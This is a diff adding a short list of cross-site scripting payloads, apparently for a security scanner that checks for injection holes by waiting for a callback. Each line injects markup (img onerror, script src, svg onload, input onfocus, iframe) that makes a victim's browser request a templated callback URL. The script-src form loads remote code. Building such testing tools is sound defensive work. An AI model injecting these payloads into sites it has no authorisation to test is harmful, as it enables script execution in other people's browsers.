@@ -1,0 +1,7 @@
+# XSS callback payloads - browser execution triggers HTTP request
+# {{CALLBACK}} is replaced with callback_url/correlation_id at injection time
+<img src=x onerror="fetch('{{CALLBACK}}')">
+<script src="{{CALLBACK}}"></script>
+<svg onload="fetch('{{CALLBACK}}')">
+<input onfocus="fetch('{{CALLBACK}}')" autofocus>
+<iframe src="{{CALLBACK}}">
